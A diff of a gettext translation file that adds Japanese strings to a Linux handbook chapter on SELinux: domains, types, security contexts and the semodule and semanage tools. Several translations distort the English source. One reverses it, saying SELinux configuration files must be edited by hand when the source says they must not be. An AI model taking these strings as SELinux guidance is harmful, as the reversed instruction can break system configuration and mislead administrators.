+msgstr "具体的に言えば、ログイン中のユーザはデフォルトのセキュリティコンテキストを割り当てられます (与えるロールに依存します)。これは現在のドメインを定義することを意味しており、ここで定義されたドメインが新しい子プロセスに割り当てられます。ユーザが現在のロールとロール対応するドメインを変更したい場合、<command>newrole -r <replaceable>role_r</replaceable> -t <replaceable>domain_t</replaceable></command> を実行しなければいけません (通常は与えられたロールに対して単一のドメインだけが許されているため <literal>-t</literal> パラメータは省略されることが多いです)。このコマンドはユーザに自分のパスワードを入力させることで認証を行います。この機能のお陰で、プログラムが自動的にロールを切り替えることを禁止できます。ロールの変更を行えるのは、ユーザが SELinux ポリシーに基いてロール変更を許可されている場合に限ります。"
 
 #. Tag: para
 #, no-c-format
 msgid "Obviously the rights do not apply to all <emphasis>objects</emphasis> (files, directories, sockets, devices, etc.). They can vary from object to object. To achieve this, each object is associated to a <emphasis>type</emphasis> (this is known as labeling). Domains' rights are thus expressed with sets of (dis)allowed operations on those types (and, indirectly, on all objects which are labeled with the given type)."
-msgstr ""
+msgstr "明らかに、この権限は全ての<emphasis>オブジェクト</emphasis> (ファイル、ディレクトリ、ソケット、デバイスなど) に適用しません。権限はオブジェクトによって異なります。これを実現するために、それぞれのオブジェクトは<emphasis>タイプ</emphasis> (ラベル付けとして知られています) に結び付けられています。このためドメインの権利はオブジェクトのタイプ (および、与えられたタイプによって間接的にラベル付けされた全てのオブジェクト) に対する一連の許可された (されていない) 操作を使って表現されます。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>EXTRA</emphasis> Domains and types are equivalent"
-msgstr ""
+msgstr "<emphasis>EXTRA</emphasis> ドメインとタイプは同じ"
 
 #. Tag: para
 #, no-c-format
 msgid "Internally, a domain is just a type, but a type that only applies to processes. That's why domains are suffixed with <literal>_t</literal> just like objects' types."
-msgstr ""
+msgstr "内部的に、ドメインはタイプに過ぎません。しかしタイプはプロセスにのみ適用されます。このため、ドメインはオブジェクトのタイプと同様に <literal>_t</literal> を末尾に付けられています。"
 
 #. Tag: para
 #, no-c-format
 msgid "By default, a program inherits its domain from the user who started it, but the standard SELinux policies expect many important programs to run in dedicated domains. To achieve this, those executables are labeled with a dedicated type (for example <command>ssh</command> is labeled with <literal>ssh_exec_t</literal>, and when the program starts, it automatically switches to the <literal>ssh_t</literal> domain). This automatic domain transition mechanism makes it possible to grant only the rights required by each program. It is a fundamental principle of SELinux."
-msgstr ""
+msgstr "デフォルトで、プログラムはプログラムを起動したユーザに割り当てられたドメインを継承しますが、標準的な SELinux のポリシーは多くの重要なプログラムが専用のドメインで実行されることを期待しています。これを成し遂げるために、重要なプログラムの実行可能ファイルは専用のタイプでラベル付けされています (例えば、<command>ssh</command> は <literal>ssh_exec_t</literal> でラベル付けされています。<command>ssh</command> プログラムが起動すると <command>ssh</command> プログラムは <literal>ssh_t</literal> ドメインに自動的に切り替わります)。この自動ドメイン遷移メカニズムによって、それぞれのプログラムに対して必要な権限だけを認めることが可能です。これが SELinux の基本原則です。"
 
 #. Tag: title
 #, no-c-format
 msgid "Automatic transitions between domains"
-msgstr ""
+msgstr "ドメイン間の自動遷移"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>IN PRACTICE</emphasis> Finding the security context"
-msgstr ""
+msgstr "<emphasis>IN PRACTICE</emphasis> セキュリティコンテキストの検索"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>security context</primary>"
-msgstr ""
+msgstr "<primary>セキュリティコンテキスト</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>context, security context</primary>"
-msgstr ""
+msgstr "<primary>コンテキスト、セキュリティコンテキスト</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary>"
-msgstr ""
+msgstr "<primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "To find the security context of a given process, you should use the <literal>Z</literal> option of <command>ps</command>."
-msgstr ""
+msgstr "あるプロセスのセキュリティコンテキストを見つけるには、<command>ps</command> の <literal>Z</literal> オプションを使うべきです。"
 
 #. Tag: screen
 #, no-c-format
@@ -1174,16 +1191,18 @@ msgid ""
 "<computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>\n"
 "<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput>\n"
 msgstr ""
+"<computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>\n"
+"<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput>\n"
 
 #. Tag: para
 #, no-c-format
 msgid "The first field contains the identity, the role, the domain and the MCS level, separated by colons. The MCS level (<emphasis>Multi-Category Security</emphasis>) is a parameter that intervenes in the setup of a confidentiality protection policy, which regulates the access to files based on their sensitivity. This feature will not be explained in this book."
-msgstr ""
+msgstr "最初のフィールドをコロンで区切ると、識別情報、ロール、ドメイン、MCS レベルの情報が判ります。MCS レベル (<emphasis>Multi-Category Security</emphasis>) は機密性保護ポリシーのセットアップに干渉するパラメータで、ファイルの重要性に基いてファイルへのアクセスを管理するものです。この本では MCS の機能を説明しません。"
 
 #. Tag: para
 #, no-c-format
 msgid "To find the current security context in a shell, you should call <command>id -Z</command>."
-msgstr ""
+msgstr "現在のセキュリティコンテキストを見つけるには、<command>id -Z</command> を実行するべきです。"
 
 #. Tag: screen
 #, no-c-format
@@ -1191,11 +1210,13 @@ msgid ""
 "<computeroutput>$ </computeroutput><userinput>id -Z</userinput>\n"
 "<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput>\n"
 msgstr ""
+"<computeroutput>$ </computeroutput><userinput>id -Z</userinput>\n"
+"<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput>\n"
 
 #. Tag: para
 #, no-c-format
 msgid "Finally, to find the type assigned to a file, you can use <command>ls -Z</command>."
-msgstr ""
+msgstr "最後に、ファイルに割り当てられたタイプを見つけるには <command>ls -Z</command> を使います。"
 
 #. Tag: screen
 #, no-c-format
@@ -1204,101 +1225,104 @@ msgid ""
 "<computeroutput>unconfined_u:object_r:user_home_t:s0 test\n"
 "     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput>\n"
 msgstr ""
+"<computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>\n"
+"<computeroutput>unconfined_u:object_r:user_home_t:s0 test\n"
+"     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput>\n"
 
 #. Tag: para
 #, no-c-format
 msgid "It is worth noting that the identity and role assigned to a file bear no special importance (they are never used), but for the sake of uniformity, all objects get assigned a complete security context."
-msgstr ""
+msgstr "ファイルに割り当てられた識別情報とロールには特別な重要性が無い (一切使われない) 点は注目に値しますが、統一性を保つ目的で、全てのオブジェクトは完全なセキュリティコンテキストを割り当てられています。"
 
 #. Tag: title
 #, no-c-format
 msgid "Setting Up SELinux"
-msgstr ""
+msgstr "SELinux のセットアップ"
 
 #. Tag: para
 #, no-c-format
 msgid "SELinux support is built into the standard kernels provided by Debian. The core Unix tools support SELinux without any modifications. It is thus relatively easy to enable SELinux."
-msgstr ""
+msgstr "SELinux のサポートは Debian の提供する標準的なカーネルに組み込まれています。コア Unix ツールは SELinux をサポートしており、修正は必要ありません。このため、SELinux を有効化することは比較的簡単です。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <command>aptitude install selinux-basics selinux-policy-default</command> command will automatically install the packages required to configure an SELinux system."
-msgstr ""
+msgstr "<command>aptitude install selinux-basics selinux-policy-default</command> コマンドで、SELinux システムを設定するために必要なパッケージが自動的にインストールされます。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis role=\"pkg\">selinux-policy-default</emphasis> package contains a set of standard rules. By default, this policy only restricts access for a few widely exposed services. The user sessions are not restricted and it is thus unlikely that SELinux would block legitimate user operations. However, this does enhance the security of system services running on the machine. To setup a policy equivalent to the old “strict” rules, you just have to disable the <literal>unconfined</literal> module (modules management is detailed further in this section)."
-msgstr ""
+msgstr "<emphasis role=\"pkg\">selinux-policy-default</emphasis> パッケージには、標準的なルールが含まれています。デフォルトで、このポリシーは広範囲にわたって提供されるサービスへのアクセスを制限するだけです。ユーザセッションは制限されませんから、SELinux が正当なユーザ操作を妨害することはほとんどありません。しかしながら、これはマシンで実行されているシステムサービスのセキュリティを強化します。古い「strict」ルールと同じポリシーをセットアップするには、<literal>行動を制限されていない</literal>モジュールを無効化しなければいけません (モジュール管理はこの節でより詳しく説明されています)。"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the policy has been installed, you should label all the available files (which means assigning them a type). This operation must be manually started with <command>fixfiles relabel</command>."
-msgstr ""
+msgstr "「strict」ポリシーをインストールしたら、全ての利用可能なファイルをラベル付けするべきです (これはファイルにタイプを割り当てることを意味します)。この操作は <command>fixfiles relabel</command> を使って手作業で開始しなければいけません。"
 
 #. Tag: para
 #, no-c-format
 msgid "The SELinux system is now ready. To enable it, you should add the <literal>selinux=1</literal> parameter to the Linux kernel. The <literal>audit=1</literal> parameter enables SELinux logging which records all the denied operations. Finally, the <literal>enforcing=1</literal> parameter brings the rules into application: without it SELinux works in its default <emphasis>permissive</emphasis> mode where denied actions are logged but still executed. You should thus modify the GRUB bootloader configuration file to append the desired parameters. One easy way to do this is to modify the <literal>GRUB_CMDLINE_LINUX</literal> variable in <filename>/etc/default/grub</filename> and to run <command>update-grub</command>. SELinux will be active after a reboot."
-msgstr ""
+msgstr "これで SELinux システムの準備が整いました。SELinux を有効化するには、<literal>selinux=1</literal> パラメータを Linux カーネルに追加する必要があります。<literal>audit=1</literal> パラメータは SELinux のログ記録を有効化します。これは全ての拒否された操作を記録するものです。最後に<literal>enforcing=1</literal> パラメータはルールをアプリケーションに強制します: <literal>enforcing=1</literal> パラメータがなければ、SELinux はデフォルトの <emphasis>permissive</emphasis> モードで動作します。<emphasis>permissive</emphasis> モードの場合、拒否された操作はログ記録され、実行されます。GRUB ブートローダ設定ファイルを変更して、必要なパラメータを追加するべきです。これ簡単に行うには、<filename>/etc/default/grub</filename> の中の <literal>GRUB_CMDLINE_LINUX</literal> 変数を変更します。その後 <command>update-grub</command> を実行します。SELinux は再起動後に動作状態になります。"
 
 #. Tag: para
 #, no-c-format
 msgid "It is worth noting that the <command>selinux-activate</command> script automates those operations and forces a labeling on next boot (which avoids new non-labeled files created while SELinux was not yet active and while the labeling was going on)."
-msgstr ""
+msgstr "<command>selinux-activate</command> スクリプトがこれらの操作を自動化し、次回起動時にラベル付けを強制する (これは SELinux がまだ動作していなかった時とラベル付けの実行中にラベル付けされていないファイルが新しく作成されることを避ける) 点は注目に値します。"
 
 #. Tag: title
 #, no-c-format
 msgid "Managing an SELinux System"
-msgstr ""
+msgstr "SELinux システムの管理"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>semodule</command></primary>"
-msgstr ""
+msgstr "<primary><command>semodule</command></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>semanage</command></primary>"
-msgstr ""
+msgstr "<primary><command>semanage</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The SELinux policy is a modular set of rules, and its installation detects and enables automatically all the relevant modules based on the already installed services. The system is thus immediately operational. However, when a service is installed after the SELinux policy, you must be able to manually enable the corresponding module. That is the purpose of the <command>semodule</command> command. Furthermore, you must be able to define the roles that each user can endorse, and this can be done with the <command>semanage</command> command."
-msgstr ""
+msgstr "SELinux ポリシーはモジュール式のルール群で、SELinux はインストール時にインストール済みのサービスに基いて対応するモジュールを自動的に検出して有効化します。そのため、このシステムはすぐに利用可能になります。しかしながら、SELinux ポリシーを設定した後にサービスをインストールした場合、対応するモジュールを手作業で有効化する必要があります。これを行うのが <command>semodule</command> コマンドです。さらに、管理者はそれぞれのユーザに与えるロールを定義する能力を持っていなければいけません。これは <command>semanage</command> を使って行います。"
 
 #. Tag: para
 #, no-c-format
 msgid "Those two commands can thus be used to modify the current SELinux configuration, which is stored in <filename>/etc/selinux/default/</filename>. Unlike other configuration files that you can find in <filename>/etc/</filename>, all those files must not be changed by hand. You should use the programs designed for this purpose."
-msgstr ""
+msgstr "このため <command>semodule</command> と <command>semanage</command> コマンドは <filename>/etc/selinux/default/</filename> に保存されている現在の SELinux 設定を変更するために使われます。<filename>/etc/</filename> に見つかる他の設定ファイルと異なり、全てのファイルは手作業で修正しなければいけません。管理者はこれらのファイルを編集するために設計されたプログラムを使うべきです。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>GOING FURTHER</emphasis> More documentation"
-msgstr ""
+msgstr "<emphasis>GOING FURTHER</emphasis> 追加的文書"
 
 #. Tag: para
 #, no-c-format
 msgid "Since the NSA doesn't provide any official documentation, the community set up a wiki to compensate. It brings together a lot of information, but you must be aware that most SELinux contributors are Fedora users (where SELinux is enabled by default). The documentation thus tends to deal specifically with that distribution. <ulink type=\"block\" url=\"http://www.selinuxproject.org\" />"
-msgstr ""
+msgstr "NSA は公式の文書を提供していないので、それを埋め合わせるためにコミュニティが wiki を設置しています。wiki は多くの情報を寄せ集めていますが、殆どの SELinux 貢献者が Fedora ユーザである点に気がつくでしょう (Fedora は SELinux をデフォルトで有効化しています)。そのため、この文書は Fedora の問題の対処に特化しています。<ulink type=\"block\" url=\"http://www.selinuxproject.org\" />"
 
 #. Tag: para
 #, no-c-format
 msgid "You should also have a look at the dedicated Debian wiki page as well as Russell Coker's blog, who is one of the most active Debian developers working on SELinux support. <ulink type=\"block\" url=\"http://wiki.debian.org/SELinux\" /> <ulink type=\"block\" url=\"http://etbe.coker.com.au/tag/selinux/\" />"
-msgstr ""
+msgstr "管理者は専用の Debian wiki ページおよび Russell Coker さんのブログを見るべきです。Russell Coker さんは SELinux サポートに取り組んでいる、最も活動的な Debian 開発者の 1 人です。<ulink type=\"block\" url=\"http://wiki.debian.org/SELinux\" /> <ulink type=\"block\" url=\"http://etbe.coker.com.au/tag/selinux/\" />"
 
 #. Tag: title
 #, no-c-format
 msgid "Managing SELinux Modules"
-msgstr ""
+msgstr "SELinux モジュールの管理"
 
 #. Tag: para
 #, no-c-format
 msgid "Available SELinux modules are stored in the <filename>/usr/share/selinux/default/</filename> directory. To enable one of these modules in the current configuration, you should use <command>semodule -i <replaceable>module.pp</replaceable></command>. The <emphasis>pp</emphasis> extension stands for <emphasis>policy package</emphasis>."
-msgstr ""
+msgstr "利用可能な SELinux モジュールは <filename>/usr/share/selinux/default/</filename> ディレクトリに保存されています。現在の設定の中で SELinux モジュールの 1 つを有効化するには、<command>semodule -i <replaceable>module.pp</replaceable></command> を使うべきです。<emphasis>pp</emphasis> 拡張子は<emphasis>ポリシーパッケージ</emphasis>を意味しています。"
 
 #. Tag: para
 #, no-c-format
 msgid "Removing a module from the current configuration is done with <command>semodule -r <replaceable>module</replaceable></command>. Finally, the <command>semodule -l</command> command lists the modules which are currently enabled. It also outputs their version numbers."
-msgstr ""
+msgstr "現在の設定からモジュールを削除するには <command>semodule -r <replaceable>module</replaceable></command> を使います。最後に、<command>semodule -l</command> コマンドは現在有効化されているモジュールとそのバージョンをリストします。"
 
 #. Tag: screen
 #, no-c-format
@@ -1315,31 +1339,42 @@ msgid ""
 "apm     1.7.0\n"
 "[...]</computeroutput>\n"
 msgstr ""
+"<computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/aide.pp</userinput>\n"
+"<computeroutput># </computeroutput><userinput>semodule -l</userinput>\n"
+"<computeroutput>aide    1.4.0\n"
+"apache  1.10.0\n"
+"apm     1.7.0\n"
+"[...]</computeroutput>\n"
+"<computeroutput># </computeroutput><userinput>semodule -r aide</userinput>\n"
+"<computeroutput># </computeroutput><userinput>semodule -l</userinput>\n"
+"<computeroutput>apache  1.10.0\n"
+"apm     1.7.0\n"
+"[...]</computeroutput>\n"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>semodule</command> immediately loads the new configuration unless you use its <literal>-n</literal> option. It is worth noting that the program acts by default on the current configuration (which is indicated by the <literal>SELINUXTYPE</literal> variable in <filename>/etc/selinux/config</filename>), but that you can modify another one by specifying it with the <literal>-s</literal> option."
-msgstr ""
+msgstr "<command>semodule</command> は <literal>-n</literal> オプションを付けない限り、すぐさま新しい設定を読み込みます。<command>semodule</command> プログラムがデフォルトで現在の設定に対して操作を行う点は注目に値します (現在の設定は <filename>/etc/selinux/config</filename> 内の <literal>SELINUXTYPE</literal> 変数によって表されます)。しかし、<literal>-s</literal> オプションを使えば、これを他のものに変更することが可能です。"
 
 #. Tag: title
 #, no-c-format
 msgid "Managing Identities"
-msgstr ""
+msgstr "ユーザの身元管理"
 
 #. Tag: para
 #, no-c-format
 msgid "Every time that a user logs in, they get assigned an SELinux identity. This identity defines the roles that they will be able to endorse. Those two mappings (from the user to the identity and from this identity to roles) are configurable with the <command>semanage</command> command."
-msgstr ""
+msgstr "ユーザはログイン時に毎回、SELinux 識別情報を割り当てられます。SELinux 識別情報はユーザに与えるロールを定義します。2 種類 (ユーザから識別情報へ、識別情報からロールへ) の対応付けは <command>semanage</command> コマンドを使って設定することが可能です。"
 
 #. Tag: para
 #, no-c-format
 msgid "You should definitely read the <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry> manual page, even if the command's syntax tends to be similar for all the concepts which are managed. You will find common options to all sub-commands: <literal>-a</literal> to add, <literal>-d</literal> to delete, <literal>-m</literal> to modify, <literal>-l</literal> to list, and <literal>-t</literal> to indicate a type (or domain)."
-msgstr ""
+msgstr "コマンドの構文はそのコマンドで管理する全ての概念に類似しているとは言うものの、管理者は <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry> マニュアルページを読むべきです。全てのサブコマンドに対して共通のオプションがあることがわかるでしょう: <literal>-a</literal> は追加、<literal>-d</literal> は削除、<literal>-m</literal> は修正、<literal>-l</literal> はリスト、<literal>-t</literal> はタイプ (またはドメイン) の指定を表します。"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>semanage login -l</command> lists the current mapping between user identifiers and SELinux identities. Users that have no explicit entry get the identity indicated in the <literal>__default__</literal> entry. The <command>semanage login -a -s user_u <replaceable>user</replaceable></command> command will associate the <emphasis>user_u</emphasis> identity to the given user. Finally, <command>semanage login -d <replaceable>user</replaceable></command> drops the mapping entry assigned to this user."
-msgstr ""
+msgstr "<command>semanage login -l</command> はユーザ識別情報と SELinux 識別情報の現在の対応付けをリストします。明確なエントリを持たないユーザは <literal>__default__</literal> エントリであらわされる識別情報を獲得します。<command>semanage login -a -s user_u <replaceable>user</replaceable></command> コマンドは <emphasis>user_u</emphasis> 識別情報を指定されたユーザに対応付けます。最後に、<command>semanage login -d <replaceable>user</replaceable></command> は対指定したユーザに関連付けられた対応付けエントリを削除します。"
 
 #. Tag: screen
 #, no-c-format
@@ -1355,11 +1390,21 @@ msgid ""
 "system_u                  system_u                  s0-s0:c0.c1023\n"
 "# </computeroutput><userinput>semanage login -d rhertzog</userinput> \n"
 msgstr ""
+"<computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>\n"
+"<computeroutput># </computeroutput><userinput>semanage login -l</userinput>\n"
+"<computeroutput>\n"
+"Login Name                SELinux User              MLS/MCS Range\n"
+"\n"
+"__default__               unconfined_u              s0-s0:c0.c1023\n"
+"rhertzog                  user_u                    None\n"
+"root                      unconfined_u              s0-s0:c0.c1023\n"
+"system_u                  system_u                  s0-s0:c0.c1023\n"
+"# </computeroutput><userinput>semanage login -d rhertzog</userinput> \n"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>semanage user -l</command> lists the mapping between SELinux user identities and allowed roles. Adding a new identity requires to define both the corresponding roles and a labeling prefix which is used to assign a type to personal files (<filename>/home/<replaceable>user</replaceable>/*</filename>). The prefix must be picked among <literal>user</literal>, <literal>staff</literal>, and <literal>sysadm</literal>. The “<literal>staff</literal>” prefix results in files of type “<literal>staff_home_dir_t</literal>”. Creating a new SELinux user identity is done with <command>semanage user -a -R <replaceable>roles</replaceable> -P <replaceable>prefix</replaceable> <replaceable>identity</replaceable></command>. Finally, you can remove an SELinux user identity with <command>semanage user -d <replaceable>identity</replaceable></command>."
-msgstr ""
+msgstr "<command>semanage user -l</command> はSELinux ユーザ識別情報と許可されたロールの対応付けをリストします。新しい識別情報を追加した場合、識別情報に対応するロールと、個人ファイル (<filename>/home/<replaceable>user</replaceable>/*</filename>) にタイプを割り当てるために使われるプレフィックスのラベル付けが必要になります。このプレフィックスは <literal>user</literal>、<literal>staff</literal>、<literal>sysadm</literal> のどれか 1 つを選ばなければいけません。「<literal>staff</literal>」プレフィックスをつけるとファイルのタイプは「<literal>staff_home_dir_t</literal>」になります。新しい SELinux ユーザ識別情報を作成するには <command>semanage user -a -R <replaceable>roles</replaceable> -P <replaceable>prefix</replaceable> <replaceable>identity</replaceable></command> を使います。最後に、SELinux ユーザ識別情報を削除するには <command>semanage user -d <replaceable>identity</replaceable></command> を使います。"
 
 #. Tag: screen
 #, no-c-format
@@ -1379,26 +1424,40 @@ msgid ""
 "user_u          user       s0         s0               user_r\n"
 "# </computeroutput><userinput>semanage user -d test_u</userinput>\n"
 msgstr ""
+"<computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>\n"
+"<computeroutput># </computeroutput><userinput>semanage user -l</userinput>\n"
+"<computeroutput>\n"
+"                Labeling   MLS/       MLS/\n"
+"SELinux User    Prefix     MCS Level  MCS Range        SELinux Roles\n"
+"\n"
+"root            sysadm     s0         s0-s0:c0.c1023   staff_r sysadm_r system_r\n"
+"staff_u         staff      s0         s0-s0:c0.c1023   staff_r sysadm_r\n"
+"sysadm_u        sysadm     s0         s0-s0:c0.c1023   sysadm_r\n"
+"system_u        user       s0         s0-s0:c0.c1023   system_r\n"
+"test_u          staff      s0         s0               staff_r user_r\n"
+"unconfined_u    unconfined s0         s0-s0:c0.c1023   system_r unconfined_r\n"
+"user_u          user       s0         s0               user_r\n"
+"# </computeroutput><userinput>semanage user -d test_u</userinput>\n"
 
 #. Tag: title
 #, no-c-format
 msgid "Managing File Contexts, Ports and Booleans"
-msgstr ""
+msgstr "ファイルコンテキスト、ポート、ブール値の管理"
 
 #. Tag: para
 #, no-c-format
 msgid "Each SELinux module provides a set of file labeling rules, but it is also possible to add custom labeling rules to cater to a specific case. For example, if you want the web server to be able to read files within the <filename>/srv/www/</filename> file hierarchy, you could execute <command>semanage fcontext -a -t httpd_sys_content_t \"/srv/www(/.*)?\"</command> followed by <command>restorecon -R /srv/www/</command>. The former command registers the new labeling rules and the latter resets the file types according to the current labeling rules."
-msgstr ""
+msgstr "各 SELinux モジュールには、ファイルラベル付けルール群が含まれますが、さらに SELinux モジュールは特別な場合に応じてラベル付けルールをカスタマイズすることが可能です。例えば、ウェブサーバに <filename>/srv/www/</filename> ファイル階層内のファイルを読むことを許可する場合、<command>semanage fcontext -a -t httpd_sys_content_t \"/srv/www(/.*)?\"</command> を実行し、その後 <command>restorecon -R /srv/www/</command> を実行します。最初のコマンドで新しいラベル付けルールを登録し、次のコマンドで現在のラベル付けルールに基いてファイルタイプを再設定します。"
 
 #. Tag: para
 #, no-c-format
 msgid "Similarly, TCP/UDP ports are labeled in a way that ensures that only the corresponding daemons can listen to them. For instance, if you want that the web server be able to listen on port 8080, you should run <command>semanage port -m -t http_port_t -p tcp 8080</command>."
-msgstr ""
+msgstr "同様に、TCP/UDP ポートをラベル付けして、ポート番号とそのポートのリッスンを許可するデーモンを対応付けることが可能です。例えば、ウェブサーバがポート 8080 番をリッスンすることを許可するには、<command>semanage port -m -t http_port_t -p tcp 8080</command> を実行します。"
 
 #. Tag: para
 #, no-c-format
 msgid "Some SELinux modules export boolean options that you can tweak to alter the behavior of the default rules. The <command>getsebool</command> utility can be used to inspect those options (<command>getsebool <replaceable>boolean</replaceable></command> displays one option, and <command>getsebool -a</command> them all). The <command>setsebool <replaceable>boolean</replaceable> <replaceable>value</replaceable></command> command changes the current value of a boolean option. The <literal>-P</literal> option makes the change permanent, it means that the new value becomes the default and will be kept across reboots. The example below grants web servers an access to home directories (this is useful when users have personal websites in <filename>~/public_html/</filename>)."
-msgstr ""
+msgstr "一部の SELinux モジュールでは、ブール値オプションを使ってデフォルトルールの挙動を微調整することが可能です。<command>getsebool</command> ユーティリティを使ってブール値オプションを調査します (<command>getsebool <replaceable>boolean</replaceable></command> は 1 つのオプションを表示し、<command>getsebool -a</command> は全てのオプションを表示します)。<command>setsebool <replaceable>boolean</replaceable> <replaceable>value</replaceable></command> コマンドはブール値オプションの現在の値を変更します。<literal>-P</literal> オプションを付けるとこの修正が永続的なものになります。つまり、新しい値がデフォルトになり、再起動後も適用される事になります。以下の例では、ウェブサーバにホームディレクトリに対するアクセス権を与えています (ユーザが個人的なウェブサイトを <filename>~/public_html/</filename> の下に作る場合、この設定を使うと便利です)。"
 
 #. Tag: screen
 #, no-c-format
@@ -1409,21 +1468,26 @@ msgid ""
 "<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> \n"
 "<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput>\n"
 msgstr ""
+"<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>\n"
+"<computeroutput>httpd_enable_homedirs --&gt; off\n"
+"# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>\n"
+"<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> \n"
+"<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput>\n"
 
 #. Tag: title
 #, no-c-format
 msgid "Adapting the Rules"
-msgstr ""
+msgstr "ルールの適用"
 
 #. Tag: para
 #, no-c-format
 msgid "Since the SELinux policy is modular, it might be interesting to develop new modules for (possibly custom) applications that lack them. These new modules will then complete the <emphasis>reference policy</emphasis>."
-msgstr ""
+msgstr "SELinux ポリシーはモジュール式なので、モジュールの用意されていない (場合によっては特注の) アプリケーション用に新しいモジュールを開発することは興味深いです。新しいモジュールは<emphasis>リファレンスポリシー</emphasis>を満足させなければいけません。"
 
 #. Tag: para
 #, no-c-format
 msgid "To create new modules, the <emphasis role=\"pkg\">selinux-policy-dev</emphasis> package is required, as well as <emphasis role=\"pkg\">selinux-policy-doc</emphasis>. The latter contains the documentation of the standard rules (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) and sample files that can be used as templates to create new modules. Install those files and study them more closely:"
-msgstr ""
+msgstr "新しいモジュールを作成するには、<emphasis role=\"pkg\">selinux-policy-dev</emphasis> および <emphasis role=\"pkg\">selinux-policy-doc</emphasis> パッケージが必要です。<emphasis role=\"pkg\">selinux-policy-doc</emphasis> パッケージには、標準的なルールに関する文書 (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) と新しいモジュールを作成するためのテンプレートとして使えるサンプルファイルが含まれます。これらのファイルをインストールし、更にしっかりと勉強して下さい:"
 
 #. Tag: screen
 #, no-c-format
@@ -1433,26 +1497,30 @@ msgid ""
 "<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.if.gz &gt;example.if</userinput>\n"
 "<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput>\n"
 msgstr ""
+"<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/Makefile.example.gz &gt;Makefile</userinput>\n"
+"<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.fc.gz &gt;example.fc</userinput>\n"
+"<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.if.gz &gt;example.if</userinput>\n"
+"<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput>\n"
 
 #. Tag: para
 #, no-c-format
 msgid "The <filename>.te</filename> file is the most important one. It defines the rules. The <filename>.fc</filename> file defines the “file contexts”, that is the types assigned to files related to this module. The data within the <filename>.fc</filename> file are used during the file labeling step. Finally, the <filename>.if</filename> file defines the interface of the module: it's a set of “public functions” that other modules can use to properly interact with the module that you're creating."
-msgstr ""
+msgstr "<filename>.te</filename> ファイルは最も重要なファイルです。これがルールを定義します。<filename>.fc</filename> ファイルは「ファイルコンテキスト」を定義します。「ファイルコンテキスト」はこのモジュールに関連するファイルに割り当てるタイプを意味します。<filename>.fc</filename> ファイルに含まれるデータはファイルのラベル付け中に使われます。最後に、<filename>.if</filename> ファイルはモジュールのインターフェイスを定義します: これは一連の「公開関数」で、他のモジュールはこの関数を使ってここで作成されたモジュールと情報をやり取りします。"
 
 #. Tag: title
 #, no-c-format
 msgid "Writing a <filename>.fc</filename> file"
-msgstr ""
+msgstr "<filename>.fc</filename> ファイルの書き方"
 
 #. Tag: para
 #, no-c-format
 msgid "Reading the below example should be sufficient to understand the structure of such a file. You can use regular expressions to assign the same security context to multiple files, or even an entire directory tree."
-msgstr ""
+msgstr "以下の例を読めば、<filename>.fc</filename> ファイルの構造を十分に理解することが可能です。復数のファイルおよび完全なディレクトリツリーに対して、同じセキュリティコンテキストを割り当てるために、正規表現を使うことが可能です。"
 
 #. Tag: title
 #, no-c-format
 msgid "<filename>example.fc</filename> file"
-msgstr ""
+msgstr "<filename>example.fc</filename> ファイル"
 
 #. Tag: programlisting
 #, no-c-format
@@ -1464,26 +1532,32 @@ msgid ""
 "\n"
 "/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)\n"
 msgstr ""
+"# myapp executable will have:\n"
+"# label: system_u:object_r:myapp_exec_t\n"
+"# MLS sensitivity: s0\n"
